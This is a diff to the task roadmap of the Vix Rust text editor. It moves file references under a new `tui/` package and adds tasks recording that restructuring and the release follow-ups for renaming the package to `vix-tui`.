-  95 non-test `unwrap()`/`expect()` remain, 48 of them in `src/`. About 40
+  95 non-test `unwrap()`/`expect()` remain, 48 of them in `tui/src/`. About 40
   follow the pattern `if app.x.is_some() { draw_x(app) }` followed by
   `app.x.as_ref().unwrap()`. Examples:
-  - `src/ui/edit_surfaces.rs:162,172,315,324,392,466,552,647,707,760,790,847,877`
+  - `tui/src/ui/edit_surfaces.rs:162,172,315,324,392,466,552,647,707,760,790,847,877`
   - `info_panels.rs` (10)
   - `picker_panels.rs` (5)
   - `choosers.rs` (4)
-  - the paste queue at `src/app.rs:7099-7126` (5 in one loop)
+  - the paste queue at `tui/src/app.rs:7099-7126` (5 in one loop)
 
   Fix: each `draw_x` takes `&X`. Then turn on
   `clippy::unwrap_used`/`expect_used` at warn level, with
@@ -7012,7 +7012,7 @@ new action.
   them off the first run. GitLab CI is unchanged.
 - [x] **T605 — One `wait_until` test helper.** Bounded poll loops (300 ×
   10 ms = 3 s caps) are copy-pasted at
-  `tests/integration/editing.rs:2216,2257,2307,2335,3288` and
+  `tui/tests/integration/editing.rs:2216,2257,2307,2335,3288` and
   `workspace.rs:838`, even though `common.rs:139` already has a deadline
   helper. Replace them all with
   `wait_until(app, poll, pred, Duration::from_secs(10))`, which gives more
@@ -7046,13 +7046,13 @@ new action.
   716 lines with 3 tests, and they cover pure helpers only.
   `handle_event` (`:324`), `handle_response` (`:370`), `configure`
   (`:444`), and request sequencing are untested. LSP has a Python mock
-  server (`tests/lsp_smoke.rs`), but DAP has none. Add a mock adapter
+  server (`tui/tests/lsp_smoke.rs`), but DAP has none. Add a mock adapter
   covering initialize → launch → stopped → stackTrace → variables → a
   failed request. vix-editor is also thin (2,022 lines, 98 pub fns, 8
   tests), so add unit tests for its non-trivial pub fns. Do this before
   T617. **Medium.**
 - [ ] **T609 — Snapshot tests per overlay family.** 13 snapshot tests
-  cover about 66 overlays (`src/ui.rs:337-560`, 25 modules). Add one
+  cover about 66 overlays (`tui/src/ui.rs:337-560`, 25 modules). Add one
   insta snapshot per family: DB workbench, AI diff, edit-value, edit-bytes,
   edit-outline, choosers, info panels, calculator/converters, and the
   merge-conflict overlay. **Medium.**
@@ -7066,9 +7066,9 @@ new action.
   "not installed" into a translated hint. **Medium, lower priority.**
 - [ ] **T611 — One overlay priority table for drawing and key routing.**
   `App` has 194 fields, 131 of them `Option<_>`, and `App::new` is 217
-  lines (`src/app.rs:2315`). Draw stacking is a cascade of 66 `is_some()`
-  checks (`src/ui.rs:337+`). Key priority is a separately ordered chain
-  (`src/app/keymap.rs:138-411`). Nothing checks that the topmost drawn
+  lines (`tui/src/app.rs:2315`). Draw stacking is a cascade of 66 `is_some()`
+  checks (`tui/src/ui.rs:337+`). Key priority is a separately ordered chain
+  (`tui/src/app/keymap.rs:138-411`). Nothing checks that the topmost drawn
   overlay is the one that gets keys. Step 1: one `OVERLAYS` table that both
   paths iterate, plus a test asserting that they agree for every overlay.
   Step 2, later, after a spec: an `Overlay` enum for the modals that are
@@ -7093,7 +7093,7 @@ new action.
 
 - [ ] **T612 — Completion filters as you type, auto-triggers, and applies
   `textEdit`/`additionalTextEdits`.**
-  - In `src/app/lsp_dap.rs:668-672`, any key other than
+  - In `tui/src/app/lsp_dap.rs:668-672`, any key other than
     Up/Down/Enter/Tab/Esc closes the popup.
   - `accept_completion` (`:618-636`) matches the word prefix only and
     ignores `textEdit.range`.
@@ -7212,13 +7212,13 @@ new action.
 - [ ] **T622 — Multi-cursor depth.** `CaretMove`
   (`crates/vix-editor-core/src/multicursor.rs:42-51`) has only
   Left/Right/Up/Down. `skip_multi_cursor` and its `_back` variant
-  (`src/app.rs:3686-3690`) just call `add_next_occurrence`, and
+  (`tui/src/app.rs:3686-3690`) just call `add_next_occurrence`, and
   `remove_multi_cursor` clears all carets. These are catalog actions that
   don't do what their names say. Fix: add Word, LineStart/End, and
   Home/End motions per caret. Add `split_selection_into_lines` and
   `select_regex_in_selection` (Kakoune/Helix `s`/`S`/`Alt-s`), plus a real
   skip and remove-last-caret. Distribute pasted lines one per caret.
-  Tests: unit tests per operation, and make `tests/integration/catalog.rs`
+  Tests: unit tests per operation, and make `tui/tests/integration/catalog.rs`
   assert real behavior. **Medium.**
 - [ ] **T623 — File-rename and watched-file notifications.** Vix has no
   `willRenameFiles`, `didRenameFiles`, or `didChangeWatchedFiles`. On an
@@ -7244,8 +7244,8 @@ new action.
   Tests: a pure `encode_osc52(text, tmux)`, and provider selection from a
   fake environment. **Small.**
 - [ ] **T626 — Live settings reload.** Saving `config.toml` from
-  `open_settings_file` (`src/app/session.rs:416`) doesn't re-apply
-  settings, because `App::save` (`src/app.rs:3744`) never reloads, so
+  `open_settings_file` (`tui/src/app/session.rs:416`) doesn't re-apply
+  settings, because `App::save` (`tui/src/app.rs:3744`) never reloads, so
   changes need a restart. Helix has `:config-reload`, and Zed applies
   settings live. Fix: when the saved path is `Settings::config_path()`,
   call `try_load_from`. On error, post a notification and keep the old
@@ -7264,12 +7264,12 @@ new action.
   Precedence is built-in < user < project < language. Update the spec.
   Tests: precedence, an untrusted workspace ignores the project file, and
   unknown keys are reported. Do this after T626. **Medium.**
-- [ ] **T628 — Terminal protocol polish.** `src/main.rs:209-225` enables
+- [ ] **T628 — Terminal protocol polish.** `tui/src/main.rs:209-225` enables
   only mouse capture, bracketed paste, and keyboard disambiguation. Vix
   has no synchronized output, no focus events, and no color-depth
   fallback: themes emit raw RGB, and there is no `COLORTERM` check. Fix:
   - Wrap `terminal.draw` in `Begin/EndSynchronizedUpdate` (DEC 2026).
-  - Enable focus change, run auto-reload (`src/app.rs:5073`) on
+  - Enable focus change, run auto-reload (`tui/src/app.rs:5073`) on
     `FocusGained`, and add an `auto_save = "focus_lost"` mode.
   - Add a pure `vix-theme` `downsample(Color, depth)` (truecolor → 256 →
     16), chosen from `COLORTERM`/`TERM`/`TERM_PROGRAM=Apple_Terminal`, and
@@ -7288,8 +7288,8 @@ new action.
   stable session ids. Tests: round trip, a stale backup shown as a diff,
   and a clean save deleting the backup. **Medium.**
 - [ ] **T630 — Picker preview pane and resume-last-picker.** The palette's
-  only preview is `:` line-goto. `src/ui/choosers.rs` and
-  `src/ui/search.rs` draw one-line rows, and nothing resumes or remembers
+  only preview is `:` line-goto. `tui/src/ui/choosers.rs` and
+  `tui/src/ui/search.rs` draw one-line rows, and nothing resumes or remembers
   queries. Telescope, snacks.picker, and Helix all have this. Fix:
   - A shared `draw_preview(path, line)` that shows a highlighted ±N-line
     window, used by the file finder, `@`/`@@`, and workspace search when
@@ -7301,7 +7301,7 @@ new action.
 - [ ] **T631 — Terminal scrollback and multiple terminals.**
   `vix-terminal`'s spec § Limitations says "Scrollback beyond the
   visible grid is not shown" and "mouse reporting is not forwarded", and
-  `App.terminal: Option<Terminal>` (`src/app.rs:1858`) allows only one.
+  `App.terminal: Option<Terminal>` (`tui/src/app.rs:1858`) allows only one.
   Fix: a `Vec<Terminal>` shown as bottom-dock tabs. Use
   `vt100::Parser::new(rows, cols, scrollback)` for a Shift+PgUp scroll
   mode. Add select and copy via `vix-clipboard`, and forward the mouse
@@ -7320,14 +7320,14 @@ new action.
   `docs/git-panel/index.md:177` lists it under Roadmap. Fix:
   - A `git.rebase_interactive` action (prompt for the base) that sets
     `GIT_SEQUENCE_EDITOR` to a throwaway script, the same trick as
-    `edit_description` (`src/app/git.rs:1165`).
-  - A todo overlay in `src/app/git_rebase.rs` with
+    `edit_description` (`tui/src/app/git.rs:1165`).
+  - A todo overlay in `tui/src/app/git_rebase.rs` with
     p/r/e/s/f/d keys and Alt-↑/↓ to reorder.
   - `git.rebase_continue`/`abort`, and `git.cherry_pick` from Browse Log.
 
   Tests: a pure todo parse/serialize round trip, and squashing two commits
   in a temp repo. **Medium.**
-- [ ] **T634 — Git stash list and worktrees.** `src/app/git.rs:110-111`
+- [ ] **T634 — Git stash list and worktrees.** `tui/src/app/git.rs:110-111`
   has only `stash_push` and `stash_pop`, and there is no worktree support.
   Magit, Neogit, and VS Code all have both. Add `git.stash_list`, a
   chooser with apply, pop, drop, and show (a diff in a read-only tab, the
@@ -7338,7 +7338,7 @@ new action.
   Neovim (CodeCompanion, avante), Emacs (agent-shell), and JetBrains
   support it. Agents that speak it include Claude Code, Gemini CLI,
   Codex, and others. Vix's `vix-ai-core` is one-shot HTTP, and
-  `spawn_ai_cli` (`src/app/ai.rs:315`) pipes one prompt. Fix: a new
+  `spawn_ai_cli` (`tui/src/app/ai.rs:315`) pipes one prompt. Fix: a new
   `vix-acp` crate that speaks JSON-RPC over the agent's stdio, reusing
   `vix-lsp-core` framing. It needs initialize, session, and prompt;
   streamed `session/update`; permission requests; and
@@ -7346,7 +7346,7 @@ new action.
   edits through `vix-ai-diff` accept/reject, show tool calls and plans in
   the AI panel, and add an `ai_agents` settings list. Write the spec and
   trust model first, since agents can write files. Tests: a mock agent
-  binary under `examples/`, a denied permission writes nothing, and edits
+  binary under `tui/examples/`, a denied permission writes nothing, and edits
   land as a pending diff. **Large.**
 - [ ] **T636 — Oil/wdired-style directory editing.** The explorer has
   only per-item operations, with no bulk rename. Fix: an
@@ -7359,7 +7359,7 @@ new action.
 - [ ] **T637 — Rhai plugin installer.** `vix-script` has load paths but
   no install, update, or registry. micro has `-plugin install/update/
   remove/list`. Fix: add `vix --plugin install <git-url>[@rev]`, plus
-  `list`, `update`, and `remove`, in `src/cli.rs`. Clone into
+  `list`, `update`, and `remove`, in `tui/src/cli.rs`. Clone into
   `scripts_dir()/<name>/`, pin the commit in `<config>/plugins.lock`, and
   add a Vix → Plugins chooser. Installed scripts keep the existing
   sandbox, with no new capabilities. Tests: a lockfile round trip, and an
@@ -7379,9 +7379,9 @@ new action.
   `crossterm::event` types, making the terminal a structural dependency of
   all input handling. New `vix-input` crate mirrors crossterm's shapes
   exactly (one-line `use` change per file, same case-normalized equality);
-  only `src/main.rs` converts crossterm events, via the `crossterm`
+  only `tui/src/main.rs` converts crossterm events, via the `crossterm`
   feature. Startup and the loop's background work moved into
-  `App::start`/`App::tick`/`App::poll_interval` (`src/app/event_loop.rs`)
+  `App::start`/`App::tick`/`App::poll_interval` (`tui/src/app/event_loop.rs`)
   so a second front end shares them. Spec:
   `crates/vix-input/spec/index.md`. **Done.**
 - [x] **T641 — GUI Phase 1: the whole App in a GPUI window (`gui/`).**
@@ -7405,6 +7405,31 @@ new action.
   macOS native menu via `muda`, `rfd` dialog). Both close through
   `file.quit`; both render the same scripted screenshot (palette + typing
   verified identical). Comparison table in `gui/spec/index.md`. **Done.**
+- [x] **T643 — The TUI becomes the `vix-tui` package in `tui/`, a sibling of
+  `gui/`.** The root is now a virtual workspace (`members = ["crates/*",
+  "tui"]`, `default-members = ["tui"]`, so a bare `cargo build`/`run`/`test`
+  still means the TUI). `src/`, `tests/`, `benches/`, `examples/`,
+  `themes/`, `man/`, `wix/` moved under `tui/` with `git mv`. Package
+  `vix-tui`, but the library crate is still `vix` (`[lib] name`) and the
+  binary still `vix`, so no `use vix::` changed; dist keeps
+  `formula`/`npm-package` = `vix` (verified with `dist plan`: archives
+  still ship `vix` + `vix.1`, formula `vix.rb`; artifacts renamed
+  `vix-tui-*`, MSI product name `vix-tui`, same upgrade code). Repo-root
+  lookups in tests/examples now go through `CARGO_MANIFEST_DIR/..`;
+  `vix-action-catalog`'s dispatch scan and the spawn-site allowlist use
+  `tui/src/…`; `-p vix` → `-p vix-tui` in `scripts/check` and all three
+  forges' CI; ~120 docs/specs re-pathed (`check-docs` taught about the
+  `tui/` and `gui/*` packages). **Done.**
+- [ ] **T644 — Release follow-ups for the `vix-tui` rename (at the next
+  release).** (1) Publish the new crates in dependency order: `vix-input`
+  first (new in T640), then the members, then `vix-tui`; drop
+  `--exclude vix-input --exclude vix-tui` from the semver step afterwards. (2) The moment the
+  release is out, change `docs/getting-started/index.md`'s install
+  one-liners (and the site's install page) from `vix-installer.sh`/`.ps1`
+  to `vix-tui-installer.sh`/`.ps1` — `latest/download` resolves to the new
+  release's assets. (3) Consider a final `vix` 1.7.x on crates.io whose
+  README points to `vix-tui`. (4) Re-check the Homebrew tap and npm
+  publish jobs on the first real release run.
 
 ---
 
@@ -7455,7 +7480,7 @@ scratch each time they come up.
   them at runtime would mean tree-sitter's WASM loader or `dlopen`, which
   `forbid(unsafe_code)` rules out in-tree. Large scope.
 - **Dock the bottom panel to the right edge** (ttt #617). This is a
-  layout-model change across `vix-bottom-dock` and `src/ui.rs`.
+  layout-model change across `vix-bottom-dock` and `tui/src/ui.rs`.
 - **Remote-control socket** for terminal-multiplexer integration (ttt's
   `--listen` and its herdr plugin: open `file:line` in a running editor
   from another pane). Before scoping, define a trust model for who can
@@ -7470,7 +7495,7 @@ T112–T115 (the modal-editing implementation; T111's audit/spec landed).
 **Run C (T201–T211) is fully done.** **Run D (docs) is fully done —
 T301–T309, all nine tasks.** `scripts/docs-coverage` reports
 zero gaps; `book.toml`/`docs/SUMMARY.md` + GitHub Pages CI jobs;
-`docs/reference/` and `man/vix.1` generated from real data,
+`docs/reference/` and `tui/man/vix.1` generated from real data,
 regenerate-and-diff gated on all three forges (now 8 gate steps); all
 38 missing docs pages written; a getting-started guide; migration
 guides for VS Code (an existing page, corrected) and Helix (new); a
